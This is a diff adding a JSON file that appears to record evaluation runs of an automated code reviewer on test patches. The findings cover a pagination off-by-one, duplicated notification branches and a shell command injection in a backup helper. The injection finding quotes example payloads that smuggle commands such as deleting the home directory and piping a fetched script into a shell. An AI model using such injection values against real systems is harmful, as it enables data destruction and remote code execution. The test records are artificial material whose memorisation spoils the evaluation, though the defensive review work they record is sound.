@@ -1,0 +1,253 @@
+{
+  "confirmation_reruns": [
+    {
+      "case_id": "correctness-off-by-one-pagination",
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Off-by-one in page slice end returns `page_size + 1` items `end = offset + page_size + 1` followed by `items[offset:end]` gives a slice of length `page_size + 1` whenever enough items remain. The committed version sliced `items[offset : offset + page_size]`. Example: `page(list(range(10)), 1, 3)` returns `[0, 1, 2, 3]`, and page 2 starts at `3`, so item `3` appears on both pages. Every page has one extra item, and that item is duplicated at the start of the next page. Any client that relies on `page_size` for layout, counting, or \"has more\" logic gets wrong results.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "end = offset + page_size + 1",
+                    "items[offset:end]",
+                    "page_size + 1",
+                    "items[offset : offset + page_size]",
+                    "page(list(range(10)), 1, 3)",
+                    "[0, 1, 2, 3]",
+                    "3",
+                    "3"
+                  ]
+                },
+                "location": {
+                  "line": 4,
+                  "path": "app/pagination.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    },
+    {
+      "case_id": "correctness-off-by-one-pagination",
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Off-by-one slice end returns one extra item per page `end = offset + page_size + 1` followed by `items[offset:end]` yields `page_size + 1` elements whenever enough items remain. For `items=[1..10]`, `page_size=3`: page 1 returns `[1,2,3,4]` and page 2 returns `[4,5,6,7]`. Item 4 appears on both pages. The pre-image sliced `items[offset : offset + page_size]`. Every caller gets pages larger than requested. Consecutive pages share a boundary item, so it is duplicated. Any consumer that assumes a page holds at most `page_size` items, or that pages don't overlap, is wrong. That includes UIs, exports and batch processors.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "end = offset + page_size + 1",
+                    "items[offset:end]",
+                    "page_size + 1",
+                    "items=[1..10]",
+                    "page_size=3",
+                    "[1,2,3,4]",
+                    "[4,5,6,7]",
+                    "items[offset : offset + page_size]"
+                  ]
+                },
+                "location": {
+                  "line": 4,
+                  "path": "app/pagination.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    },
+    {
+      "case_id": "quality-duplicated-branch-logic",
+      "run": {
+        "cases": [
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Duplicated message-building logic across notification branches The new `sms` branch repeats the `email` branch's `msg = format_message(user)` line (`app/notify.py:3`). Only the send call differs (`send_sms(user.phone, msg)` vs `send_email(user.email, msg)`). Each new channel copies the message-building step. If the message formatting later needs a channel-specific argument or a change, each branch has to be updated separately, and one can be missed. This is a maintainability risk, not a correctness defect today.",
+                "extra": {
+                  "defect_kind": "duplicated-branch-logic",
+                  "evidence_quotes": [
+                    "sms",
+                    "email",
+                    "msg = format_message(user)",
+                    "app/notify.py:3",
+                    "send_sms(user.phone, msg)",
+                    "send_email(user.email, msg)"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    },
+    {
+      "case_id": "quality-duplicated-branch-logic",
+      "run": {
+        "cases": [
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "New `sms` branch duplicates the `email` branch's message-building step The `sms` branch repeats `msg = format_message(user)` from the `email` branch (line 3). The only difference between the branches is the recipient field and the send function (`user.email` with `send_email`, `user.phone` with `send_sms`). Each new channel repeats the formatting step. If message construction changes, for example by needing a per-channel argument, every branch must be edited and the copies can drift apart. This affects maintainability only, not correctness.",
+                "extra": {
+                  "defect_kind": "duplicated-branch-logic",
+                  "evidence_quotes": [
+                    "sms",
+                    "msg = format_message(user)",
+                    "email",
+                    "user.email",
+                    "send_email",
+                    "user.phone",
+                    "send_sms"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    }
+  ],
+  "invocations": [
+    {
+      "case_id": null,
+      "run": {
+        "cases": [
+          {
+            "id": "correctness-off-by-one-pagination",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Off-by-one in page slice returns `page_size + 1` items The diff changes the slice end from `offset + page_size` to `offset + page_size + 1`. Python slices already exclude the end index, so the `+ 1` is wrong. For `items=[1..10]`, `page_number=1`, `page_size=3`, the result is `[1, 2, 3, 4]` instead of `[1, 2, 3]`. Page 2 then starts at `4`, which page 1 already returned. Every page returns one item too many and duplicates the first item of the next page. Any caller that relies on the page size or walks the pages will see wrong results, for example a UI showing 11 rows for a page size of 10.",
+                "extra": {
+                  "defect_kind": "off-by-one",
+                  "evidence_quotes": [
+                    "offset + page_size",
+                    "offset + page_size + 1",
+                    "+ 1",
+                    "items=[1..10]",
+                    "page_number=1",
+                    "page_size=3",
+                    "[1, 2, 3, 4]",
+                    "[1, 2, 3]",
+                    "4"
+                  ]
+                },
+                "location": {
+                  "line": 3,
+                  "path": "app/pagination.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "no-op-comment-and-rename",
+            "input_kind": "patch",
+            "produced_findings": [],
+            "status": "executed"
+          },
+          {
+            "id": "quality-duplicated-branch-logic",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "`sms` branch duplicates the `email` branch's message-formatting logic the new `elif kind == \"sms\":` branch repeats `msg = format_message(user)` from the `email` branch at lines 3-4. The two branches differ only in the send function and the contact field (`send_email(user.email, \u2026)` vs `send_sms(user.phone, \u2026)`). each additional channel copies the same formatting step, so a change to how the message is built has to be made in every branch and can drift between them. Consistency and maintainability suffer. This is not a correctness defect today.",
+                "extra": {
+                  "defect_kind": "duplicated-branch-logic",
+                  "evidence_quotes": [
+                    "elif kind == \"sms\":",
+                    "msg = format_message(user)",
+                    "email",
+                    "send_email(user.email, \u2026)",
+                    "send_sms(user.phone, \u2026)"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 7,
+                    "start": 5
+                  },
+                  "path": "app/notify.py"
+                },
+                "severity": "P2"
+              }
+            ],
+            "status": "executed"
+          },
+          {
+            "id": "security-command-injection",
+            "input_kind": "patch",
+            "produced_findings": [
+              {
+                "claim": "Shell command injection via `name` in `make_archive` `cmd = f\"tar -czf {name}.tar.gz data/\"` is passed to `subprocess.run(cmd, shell=True, check=True)`. `name` is not quoted, validated, or escaped, so the shell interprets metacharacters in it. For example, `name=\"x; rm -rf ~ #\"` or `name=\"$(curl evil|sh)\"` runs attacker-chosen commands. The previous list-form call (`[\"tar\", \"-czf\", name + \".tar.gz\", \"data/\"]`) did not invoke a shell. Any caller that can influence `name` can run arbitrary commands with the privileges of the process. Even for benign input, a name with spaces or glob characters breaks the archive command or writes to the wrong path.",
+                "extra": {
+                  "defect_kind": "command-injection",
+                  "evidence_quotes": [
+                    "cmd = f\"tar -czf {name}.tar.gz data/\"",
+                    "subprocess.run(cmd, shell=True, check=True)",
+                    "name",
+                    "name=\"x; rm -rf ~ #\"",
+                    "name=\"$(curl evil|sh)\"",
+                    "[\"tar\", \"-czf\", name + \".tar.gz\", \"data/\"]"
+                  ]
+                },
+                "location": {
+                  "lines": {
+                    "end": 6,
+                    "start": 5
+                  },
+                  "path": "app/backup.py"
+                },
+                "severity": "P0"
+              }
+            ],
+            "status": "executed"
+          }
+        ],
+        "ok": true
+      }
+    }
+  ]
+}
